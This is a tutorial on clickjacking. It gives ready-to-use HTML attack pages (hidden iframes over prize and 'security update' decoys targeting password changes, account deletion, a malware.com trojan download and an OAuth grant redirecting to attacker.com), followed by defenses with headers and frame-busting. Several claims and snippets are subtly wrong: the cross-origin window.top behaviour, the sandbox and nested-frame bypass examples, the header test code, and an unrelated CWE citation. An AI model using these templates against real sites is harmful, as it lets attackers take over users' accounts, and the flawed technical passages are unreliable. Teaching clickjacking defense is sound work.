# Clickjacking (UI Redressing)

## Definition

Clickjacking is a security vulnerability where an attacker tricks a user into clicking on something different from what they perceive. The attacker overlays an invisible or partially transparent iframe or div element containing the target website on top of a decoy website. When the user clicks on what they think is a harmless button or link on the decoy site, they are actually clicking on hidden interactive elements from the target site.

The attack exploits the fact that users cannot easily determine whether an interface element belongs to the page they think they're on or to a hidden frame. This can be used to perform unauthorized actions on behalf of the user, such as changing account settings, making purchases, or granting permissions.

---

## How Transparent Iframe Overlay Works

**Attack flow:**

1. **Attacker crafts a decoy page**: Creates an attractive or innocuous webpage (e.g., "Click here to win a prize")
2. **Attacker embeds a hidden iframe**: Places an iframe pointing to the target website (e.g., bank.com) on top of the decoy
3. **Make it invisible or semi-transparent**: Uses CSS to position the iframe over the decoy's clickable elements with `opacity: 0` or `opacity: 0.001`
4. **User clicks thinking they're on the decoy**: Unaware of the hidden iframe, the user clicks what they think is a button on the decoy page
5. **Click reaches the hidden iframe**: The click actually triggers an action on the target website (e.g., transferring money, changing password, or granting permission)
6. **Action is performed**: If the user is already authenticated on the target site, the action succeeds without their knowledge

**Example attack HTML:**

```html
<!DOCTYPE html>
<html>
<head>
  <title>Congratulations! You've Won!</title>
  <style>
    body {
      background: linear-gradient(to bottom, #ff6b6b, #ff8787);
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 20px;
      text-align: center;
    }

    .decoy-content {
      position: relative;
      z-index: 1; /* In front of iframe */
    }

    .decoy-button {
      background: gold;
      border: 3px solid orange;
      padding: 20px 40px;
      font-size: 24px;
      cursor: pointer;
      border-radius: 10px;
      margin: 20px;
    }

    .hidden-iframe {
      position: absolute;
      top: 50px;
      left: 50px;
      width: 400px;
      height: 400px;
      opacity: 0; /* Completely invisible */
      z-index: 2; /* Above other content but hidden */
      border: none;
      pointer-events: auto; /* Captures clicks */
    }
  </style>
</head>
<body>
  <h1>You've Won $1,000,000!</h1>
  <p>Click the button below to claim your prize!</p>

  <!-- The hidden iframe pointing to target website -->
  <iframe
    class="hidden-iframe"
    src="https://bank.example.com/settings/change-password"
    frameborder="0"
  ></iframe>

  <!-- Decoy button positioned where the real button would be -->
  <button class="decoy-button" onclick="alert('Congratulations!')">
    CLAIM PRIZE NOW
  </button>
</body>
</html>
```

When the user clicks on "CLAIM PRIZE NOW", the click goes through the transparent iframe to the bank website. If the user is logged in, they might unknowingly change their password or authorize a transaction.

---

## UI Redressing Variants

### 1. Transparent Iframe Clickjacking

```html
<!-- Most common variant -->
<iframe
  src="https://target.com/sensitive-action"
  style="position: fixed; top: 0; left: 0; width: 100%; height: 100%;
         opacity: 0; z-index: 9999; border: none;"
>
</iframe>

<!-- Decoy content under the iframe -->
<h1>Click here to watch video!</h1>
<button>Play Video</button>
```

### 2. Redressing with Semi-Transparent Overlay

```html
<!-- Attacker shows part of real site but with misleading instructions -->
<iframe
  src="https://target.com/account-settings"
  style="position: fixed; top: 0; left: 0; width: 100%; height: 100%;
         opacity: 0.3; z-index: 9999; border: none;"
>
</iframe>

<!-- Overlay content with instructions that contradict the real site -->
<div style="position: absolute; top: 50%; left: 50%; font-size: 32px;
            color: red; z-index: 10000;">
  CLICK THE RED BUTTON TO CONTINUE
</div>
```

The user sees a slightly transparent version of the target site but with fake instructions, tricking them into clicking the wrong element.

### 3. Combo Box Hijacking

```html
<!-- Clickjacking combined with a dropdown -->
<iframe
  src="https://target.com"
  style="position: fixed; top: 0; left: 0; width: 100%; height: 100%;
         opacity: 0; z-index: 9999;"
>
</iframe>

<!-- Decoy dropdown that visually appears to be on the attacker's site -->
<select style="position: fixed; top: 200px; left: 200px; z-index: 10000;">
  <option>Select an option</option>
  <option>Option 1</option>
  <option>Option 2</option>
</select>
```

When the user tries to select a dropdown option, the click goes through to the iframe underneath.

### 4. Cookie/CSRF Token Exploitation

```html
<!-- Even if the iframe is not fully transparent, an attacker can -->
<!-- position it so critical buttons align perfectly -->
<iframe
  src="https://target.com/delete-account"
  style="position: absolute; top: 400px; left: 100px;
         width: 200px; height: 50px;
         opacity: 0; z-index: 9999; border: none;"
>
</iframe>

<!-- Decoy "OK" button positioned to align with iframe's delete button -->
<button style="position: absolute; top: 400px; left: 100px;
              width: 200px; height: 50px;">
  Click OK to continue
</button>
```

---

## Attack Scenarios

### Scenario 1: Unauthorized Account Changes

**Attacker's goal**: Change victim's password

```javascript
// Victim visits attacker's website
// Attacker's site has a hidden iframe:
// <iframe src="https://mybank.com/settings/change-password"></iframe>

// Positioned over a "Click to win!" button
// Victim clicks, thinking they're interacting with the decoy
// If victim is logged into mybank.com, password change form submits
// Account is compromised
```

### Scenario 2: Social Engineering with Malware

```html
<!-- Legitimate-looking prompt to install browser extension -->
<!-- But clicks go through to attacker-controlled iframe -->
<h1>Your Browser Needs an Update</h1>
<button style="z-index: 1;">
  Install Security Update
</button>

<!-- Hidden iframe to malicious download page -->
<iframe
  src="https://malware.com/trojan.exe"
  style="opacity: 0; position: fixed; width: 100%; height: 100%;
         z-index: 2;"
>
</iframe>
```

### Scenario 3: Third-party Permission Grants

```html
<!-- OAuth permission screen hijacking -->
<h1>Congratulations! Click to Get Your Prize</h1>
<button>GET PRIZE</button>

<!-- Hidden OAuth authorization from Google/Facebook -->
<iframe
  src="https://accounts.google.com/oauth/authorize?scope=email,contacts,calendar&redirect_uri=attacker.com"
  style="opacity: 0; position: fixed; width: 100%; height: 100%; z-index: 9999;"
>
</iframe>
```

---

## Prevention: X-Frame-Options Header

The `X-Frame-Options` HTTP header tells browsers whether a page can be embedded in a frame. This is the primary defense against clickjacking.

### Implementation

**Option 1: DENY (Most Secure)**

```http
X-Frame-Options: DENY
```

Prevents the page from being embedded in any frame, regardless of origin. Use this if your site doesn't need to be framed.

```javascript
// Express.js example
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');
  next();
});

// Or using helmet middleware
const helmet = require('helmet');
app.use(helmet.frameguard({ action: 'deny' }));
```

**Option 2: SAMEORIGIN**

```http
X-Frame-Options: SAMEORIGIN
```

Allows the page to be framed only by pages from the same origin. Use this if you embed your own pages in iframes.

```javascript
// Express.js example
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  next();
});

// Or using helmet
app.use(helmet.frameguard({ action: 'sameorigin' }));
```

**Option 3: ALLOW-FROM (Deprecated)**

```http
X-Frame-Options: ALLOW-FROM https://trusted.example.com
```

This option is deprecated. Modern browsers don't support it. Use CSP frame-ancestors instead.

### How X-Frame-Options Works

```javascript
// When browser receives this page response:
// X-Frame-Options: DENY

// The browser prevents it from being loaded in ANY frame:
// <iframe src="this-page.html"></iframe> --> BLOCKED

// When:
// X-Frame-Options: SAMEORIGIN

// The browser allows it only in same-origin frames:
// <iframe src="this-page.html"></iframe> // same origin -> ALLOWED
// But attacker.com trying to embed it -> BLOCKED
```

---

## Prevention: CSP frame-ancestors Directive

Content Security Policy's `frame-ancestors` directive is a modern, more flexible alternative to `X-Frame-Options`.

```http
Content-Security-Policy: frame-ancestors 'none';
```

Prevents embedding in any frame (equivalent to `X-Frame-Options: DENY`).

```http
Content-Security-Policy: frame-ancestors 'self';
```

Allows embedding only from same origin (equivalent to `X-Frame-Options: SAMEORIGIN`).

```http
Content-Security-Policy: frame-ancestors 'self' https://trusted.example.com;
```

Allows embedding from same origin or specific trusted domains.

### Implementation

```javascript
// Express.js
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "frame-ancestors 'self';"
  );
  next();
});

// With helmet
const helmet = require('helmet');
app.use(helmet.contentSecurityPolicy({
  directives: {
    frameAncestors: ["'self'", 'https://trusted.example.com']
  }
}));
```

### Browser Support

- **X-Frame-Options**: Supported by all modern browsers
- **CSP frame-ancestors**: Supported by modern browsers (IE 11 and older don't support it)
- **Best practice**: Implement both for maximum compatibility

```javascript
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  res.setHeader(
    'Content-Security-Policy',
    "frame-ancestors 'self';"
  );
  next();
});
```

---

## JavaScript Frame-Busting (Limited Effectiveness)

Frame-busting code detects if a page is being framed and breaks out of it. However, this approach is unreliable and not recommended as a primary defense.

### How Frame-Busting Works

```javascript
// Classic frame-busting code
if (window.self !== window.top) {
  window.top.location = window.self.location;
}

// More aggressive variant
if (window.top !== window.self) {
  top.location.href = self.location.href;
}

// Even more complex
try {
  if (window !== window.parent) {
    window.parent.location = window.location;
  }
} catch (e) {
  // Silently fail if cross-origin
}
```

### Why Frame-Busting is Unreliable

**1. Cross-origin framing prevention:**

If the attacker's site and target site are on different origins, the JavaScript in the target frame cannot access `window.top` due to same-origin policy. Frame-busting fails silently.

```javascript
// In frame at https://bank.com/page.html
if (window.self !== window.top) {
  // This comparison throws an error because we can't access window.top
  // due to same-origin policy
  // Even if it succeeded, we can't set window.top.location
}
```

**2. Attacker workarounds:**

```javascript
// Attacker can use framebuster-busting techniques

// 1. Sandbox attribute prevents script execution
<iframe src="https://target.com" sandbox="allow-same-origin allow-scripts"></iframe>

// 2. onload handler can catch errors
<iframe src="https://target.com" onload="
  try {
    iframe.contentWindow.preventBusting = true;
  } catch(e) {}
"></iframe>

// 3. Nested frames confuse busting code
<iframe>
  <iframe src="https://target.com"></iframe>
</iframe>

// 4. Replace the busting code before it runs
// Attacker loads the target page and replaces busting functions
```

### Conclusion on Frame-Busting

**Do NOT rely on frame-busting alone.** It's a weak defense that attackers can easily bypass. Instead:

1. **Use X-Frame-Options or CSP frame-ancestors** (server-side, cannot be bypassed)
2. Only use frame-busting as an additional layer for older browsers
3. Focus on server-side protections

---

## Complete Prevention Checklist

### Server-side Defenses (Primary)

```javascript
// 1. X-Frame-Options header (required, most compatible)
res.setHeader('X-Frame-Options', 'SAMEORIGIN');

// 2. CSP frame-ancestors directive (modern, flexible)
res.setHeader('Content-Security-Policy', "frame-ancestors 'self';");

// 3. Additional security headers
res.setHeader('X-Content-Type-Options', 'nosniff');
res.setHeader('X-XSS-Protection', '1; mode=block');
```

### Client-side Defensive Coding

```javascript
// Sensitive actions should require additional verification
function changePassword(newPassword) {
  // Don't trust a single form submission
  // Require user re-authentication
  const confirmed = confirm(
    'Are you about to change your password? This action cannot be undone.'
  );

  if (!confirmed) {
    return;
  }

  // Implement CSRF token validation server-side
  // Require email confirmation for account changes
  // Use multi-factor authentication for sensitive operations
}
```

### User Education

- Warn users about suspicious behavior (unexpected permission requests)
- Implement behavioral monitoring (e.g., alert if user suddenly changes security settings)
- Teach users to verify they're on the correct website before taking sensitive actions

---

## Best Practices

1. **Always deploy X-Frame-Options header**
   - Use `DENY` if you don't need framing
   - Use `SAMEORIGIN` if you frame your own pages

2. **Combine with CSP frame-ancestors**
   - More flexible than X-Frame-Options
   - Better for complex framing scenarios
   - Modern alternative/supplement

3. **Implement additional verification for sensitive actions**
   - Require confirmation dialogs
   - Request re-authentication for important changes
   - Implement CSRF token validation

4. **Use HTTPS exclusively**
   - Prevents man-in-the-middle attacks
   - Ensures headers are delivered securely

5. **Implement SameSite cookie attribute**
   - Prevents cookies from being sent to cross-site requests
   - Mitigates some CSRF attacks

```javascript
// When setting cookies, use SameSite
res.cookie('sessionId', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'Strict' // or 'Lax'
});
```

6. **Monitor and log suspicious activity**
   - Track rapid form submissions from the same IP
   - Detect unusual user actions (e.g., password change at 3 AM from different location)
   - Alert users of account changes

7. **Implement strong authentication**
   - Multi-factor authentication (MFA) prevents account takeover even if clickjacked
   - Requires attacker to have multiple factors
   - Makes low-effort attacks less rewarding

8. **Regular security testing**
   - Test that X-Frame-Options headers are properly set
   - Verify sensitive pages cannot be framed
   - Penetration test for clickjacking vulnerabilities

---

## Testing for Clickjacking Vulnerabilities

```javascript
// Test 1: Verify X-Frame-Options header exists
// Open browser DevTools Console:
console.log(
  'X-Frame-Options header: ' +
  (document.currentScript?.dataset?.headerValue || 'Check Network tab')
);

// Or check the Network tab in DevTools for the response headers

// Test 2: Try to frame the page
// Create a test HTML file:
/*
<iframe src="https://target.com"></iframe>
*/

// If the page loads in the iframe without issue, headers may be missing

// Test 3: Automated testing with Burp Suite or OWASP ZAP
// These tools can check for missing security headers automatically
```

---

## Real-world Clickjacking Examples

- **2008 Twitter Clickjacking**: Attackers could trick users into clicking "Follow" button
- **2010 Facebook Clickjacking**: Users unknowingly "Liked" malicious content
- **2015 Webcam Hijacking**: Clickjacking combined with browser exploits to activate webcams
- **Ongoing OAuth Hijacking**: Permission screens remain targets for clickjacking attacks

---

## Related Reading

- OWASP: Clickjacking
- CWE-248: Uncaught Exception
- CWE-1021: Improper Restriction of Rendered UI Layers or Frames
- RFC 7034: HTTP Header Field X-Frame-Options
- Content Security Policy Specification
